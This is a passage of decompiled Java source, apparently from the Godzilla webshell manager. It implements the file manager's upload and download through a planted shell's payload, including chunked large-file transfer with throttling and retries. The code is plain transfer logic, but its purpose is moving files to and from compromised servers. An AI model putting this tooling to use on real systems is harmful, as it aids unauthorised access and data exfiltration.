/* 680 */     if (bigFileUpload) {
/* 681 */       state = uploadBigFile(uploadFileString, selectdFile);
/*     */     } else {
/*     */       try {
/* 684 */         FileInputStream fileInputStream = new FileInputStream(selectdFile);
/* 685 */         data = functions.readInputStream(fileInputStream);
/* 686 */         fileInputStream.close();
/* 687 */       } catch (FileNotFoundException e1) {
/* 688 */         Log.error(e1);
/* 689 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "文件不存在", "提示", 2);
/* 690 */       } catch (IOException e1) {
/* 691 */         Log.error(e1);
/* 692 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), e1.getMessage(), "提示", 2);
/*     */       } 
/* 694 */       state = this.payload.uploadFile(uploadFileString, data);
/*     */     } 
/* 696 */     if (state) {
/* 697 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "上传成功", "提示", 1);
/*     */     } else {
/* 699 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "上传失败", "提示", 2);
/*     */     } 
/* 701 */     Log.log(String.format("%s finish \t threadId: %s", new Object[] { "upload", Long.valueOf(Thread.currentThread().getId()) }), new Object[0]);
/*     */   }
/*     */   private void GDownloadFile(boolean bigFileDownload) {
/* 704 */     String file = getSelectdFile();
/* 705 */     FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion((Frame)this.shellEntity.getFrame(), "download", file, "");
/* 706 */     if (fileOpertionInfo.getOpertionStatus().booleanValue() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo
/* 707 */       .getDestFileName().trim().length() > 0) {
/* 708 */       if (fileOpertionInfo.getDestFileName().length() > 0) {
/* 709 */         downloadFile(fileOpertionInfo.getSrcFileName(), new File(fileOpertionInfo.getDestFileName()), bigFileDownload);
/*     */       } else {
/* 711 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "下载路径为空", "提示", 2);
/*     */       } 
/*     */     } else {
/* 714 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "信息填写不完整", "提示", 2);
/*     */     } 
/*     */   }
/*     */   
/*     */   private void downloadFile(boolean bigFileDownload) {
/* 719 */     GFileChooser chooser = new GFileChooser();
/* 720 */     chooser.setFileSelectionMode(0);
/* 721 */     boolean flag = (0 == chooser.showDialog(new JLabel(), "选择"));
/* 722 */     File selectdFile = chooser.getSelectedFile();
/* 723 */     String srcFile = getSelectdFile();
/* 724 */     if (flag && srcFile != null && srcFile.trim().length() > 0) {
/* 725 */       if (selectdFile != null) {
/* 726 */         downloadFile(srcFile, selectdFile, bigFileDownload);
/*     */       } else {
/* 728 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "信息填写不完整", "提示", 2);
/*     */       } 
/*     */     } else {
/* 731 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "未选中下载文件", "提示", 2);
/*     */     } 
/*     */   }
/*     */   private void downloadFile(String srcFileString, File destFile, boolean bigFileDownload) {
/* 735 */     byte[] data = new byte[0];
/* 736 */     Log.log(String.format("%s starting %s -> %s\t threadId: %s", new Object[] { "download", srcFileString, destFile, Long.valueOf(Thread.currentThread().getId()) }), new Object[0]);
/* 737 */     boolean state = false;
/* 738 */     if (bigFileDownload) {
/* 739 */       state = downloadBigFile(srcFileString, destFile);
/*     */     } else {
/* 741 */       data = this.payload.downloadFile(srcFileString);
/* 742 */       state = functions.filePutContent(destFile, data);
/*     */     } 
/* 744 */     if (state) {
/* 745 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "下载成功", "提示", 1);
/*     */     } else {
/* 747 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "下载失败", "提示", 2);
/*     */     } 
/* 749 */     Log.log(String.format("%s finish \t threadId: %s", new Object[] { "download", Long.valueOf(Thread.currentThread().getId()) }), new Object[0]);
/*     */   }
/*     */   private boolean downloadBigFile(String srcFileString, File destFile) {
/* 752 */     int bigFileErrorRetryNum = Db.getSetingIntValue("bigFileErrorRetryNum", 5);
/* 753 */     int bigFileSendRequestSleep = Db.getSetingIntValue("bigFileSendRequestSleep", 521);
/* 754 */     int oneceBigFileDownloadByteNum = Db.getSetingIntValue("oneceBigFileDownloadByteNum", 1048576);
/* 755 */     ApplicationContext.isShowHttpProgressBar.set(Boolean.valueOf(false));
/* 756 */     int cuurentOffset = 0;
/* 757 */     int errorNum = 0;
/*     */     try {
/* 759 */       int fileSize = this.payload.getFileSize(srcFileString);
/* 760 */       if (fileSize != -1) {
/*     */         
/* 762 */         FileOutputStream fileOutputStream = new FileOutputStream(destFile);
/* 763 */         HttpProgressBar httpProgressBar = new HttpProgressBar(String.format(EasyI18N.getI18nString("大文件下载开始 文件名:%s"), new Object[] { srcFileString }), fileSize);
/* 764 */         label27: while (cuurentOffset < fileSize) {
/*     */           while (true) {
/*     */             try {
/* 767 */               if (errorNum < bigFileErrorRetryNum) {
/* 768 */                 if (httpProgressBar.isClose()) {
/* 769 */                   Log.log(String.format("大文件上传结束 文件大小:%d 上传大小:%d", new Object[] { Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) }), new Object[0]);
/* 770 */                   fileOutputStream.close();
/* 771 */                   GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "已强制关闭", "提示", 0);
/* 772 */                   httpProgressBar.close();
/* 773 */                   return false;
/*     */                 } 
/* 775 */                 Thread.sleep(bigFileSendRequestSleep);
/* 776 */                 byte[] result = this.payload.bigFileDownload(srcFileString, cuurentOffset, oneceBigFileDownloadByteNum);
/* 777 */                 if (result.length == oneceBigFileDownloadByteNum || result.length + cuurentOffset == fileSize) {
/* 778 */                   cuurentOffset += result.length;
/* 779 */                   fileOutputStream.write(result);
/* 780 */                   httpProgressBar.setValue(cuurentOffset);
/*     */                   continue label27;
/*     */                 } 
/* 783 */                 fileOutputStream.write(result);
/* 784 */                 Log.error(new String(result));
/* 785 */                 GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), new String(result), "错误提示", 0);
/* 786 */                 fileOutputStream.close();
/* 787 */                 httpProgressBar.close();
/* 788 */                 return false;
/*     */               } 
/*     */               
/* 791 */               Log.log(String.format("大文件下载结束 文件大小:%d 下载大小:%d", new Object[] { Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) }), new Object[0]);
/* 792 */               httpProgressBar.close();
/* 793 */               GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "错误次数超限", "提示", 0);
/* 794 */               fileOutputStream.close();
/* 795 */               return false;
/*     */             }
/* 797 */             catch (Exception e) {
/* 798 */               errorNum++;
/* 799 */               Log.error(e);
/* 800 */               Thread.sleep(500L);
/*     */             } 
/*     */           } 
/*     */         } 
/* 804 */         fileOutputStream.close();
/* 805 */         Log.log("大文件下载结束 src:%s dest:%s 文件大小:%d 下载大小:%d", new Object[] { srcFileString, destFile.getAbsolutePath(), Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) });
/* 806 */         httpProgressBar.close();
/* 807 */         return true;
/*     */       } 
/* 809 */       GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "大文件下载失败 文件不存在或者无法访问", "提示", 0);
/* 810 */       Log.error("大文件下载失败 文件不存在或者无法访问");
/*     */     }
/* 812 */     catch (Exception e) {
/* 813 */       Log.error(e);
/* 814 */       GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), e.getMessage(), "错误提示", 0);
/*     */     } 
/* 816 */     return false;
/*     */   }
/*     */   
/*     */   public boolean uploadBigFile(String uploadFileString, File selectdFile) {
/* 820 */     int bigFileSendRequestSleep = Db.getSetingIntValue("bigFileSendRequestSleep", 521);
/* 821 */     int bigFileErrorRetryNum = Db.getSetingIntValue("bigFileErrorRetryNum", 5);
/* 822 */     int oneceBigFileUploadByteNum = Db.getSetingIntValue("oneceBigFileUploadByteNum", 1048576);
/* 823 */     ApplicationContext.isShowHttpProgressBar.set(Boolean.valueOf(false));
/*     */     try {
/* 825 */       FileInputStream fileInputStream = new FileInputStream(selectdFile);
/* 826 */       int fileSize = (int)selectdFile.length();
/* 827 */       byte[] readData = new byte[oneceBigFileUploadByteNum];
/* 828 */       byte[] result = new byte[0];
/* 829 */       int cuurentOffset = 0;
/* 830 */       int readLen = 0;
/* 831 */       HttpProgressBar httpProgressBar = new HttpProgressBar(String.format(EasyI18N.getI18nString("大文件上传开始 文件名:%s"), new Object[] { selectdFile.getAbsolutePath() }), fileSize);
/* 832 */       int errorNum = 0;
/*     */       
/* 834 */       Log.log(String.format("大文件上传开始 src:%s dest:%s 文件大小:%d 上传大小:%d", new Object[] { selectdFile.getAbsolutePath(), uploadFileString, Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) }), new Object[0]);
/*     */       
/* 836 */       label23: while ((readLen = fileInputStream.read(readData)) != -1) {
/* 837 */         result = Arrays.copyOfRange(readData, 0, readLen);
/*     */         while (true) {
/*     */           try {
/* 840 */             if (errorNum < bigFileErrorRetryNum) {
/* 841 */               if (httpProgressBar.isClose()) {
/* 842 */                 Log.log(String.format("大文件上传结束 文件大小:%d 上传大小:%d", new Object[] { Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) }), new Object[0]);
/* 843 */                 fileInputStream.close();
/* 844 */                 GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "已强制关闭", "提示", 0);
/* 845 */                 httpProgressBar.close();
/* 846 */                 return false;
/*     */               } 
/*     */               
/* 849 */               Thread.sleep(bigFileSendRequestSleep);
/* 850 */               String flag = this.payload.bigFileUpload(uploadFileString, cuurentOffset, result);
/* 851 */               if ("ok".equals(flag)) {
/* 852 */                 errorNum = 0;
/* 853 */                 cuurentOffset += readLen;
/* 854 */                 httpProgressBar.setValue(cuurentOffset);
/*     */                 continue label23;
/*     */               } 
/* 857 */               Log.log(String.format("大文件上传结束 文件大小:%d 上传大小:%d", new Object[] { Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) }), new Object[0]);
/* 858 */               httpProgressBar.close();
/* 859 */               GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), flag, "提示", 0);
/* 860 */               fileInputStream.close();
/* 861 */               return false;
/*     */             } 
/*     */             
/* 864 */             Log.log(String.format("大文件上传结束 文件大小:%d 上传大小:%d", new Object[] { Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) }), new Object[0]);
/* 865 */             httpProgressBar.close();
/* 866 */             GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "错误次数超限", "提示", 0);
/* 867 */             fileInputStream.close();
/* 868 */             return false;
/*     */           }
/* 870 */           catch (Exception e) {
/* 871 */             errorNum++;
/* 872 */             Log.error(e);
/* 873 */             Thread.sleep(500L);
/*     */           } 
/*     */         } 
/*     */       } 
/* 877 */       fileInputStream.close();
/* 878 */       Log.log("大文件上传结束 src:%s dest:%s 文件大小:%d 上传大小:%d", new Object[] { selectdFile.getAbsolutePath(), uploadFileString, Integer.valueOf(fileSize), Integer.valueOf(cuurentOffset) });
/* 879 */       httpProgressBar.close();
/* 880 */       return true;
/*     */     }
/* 882 */     catch (Exception e) {
/* 883 */       Log.error(e);
/* 884 */       GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), e.getMessage(), "错误提示", 0);
/* 885 */       return false;
/*     */     } 
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\cor\\ui\component\ShellFileManager.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */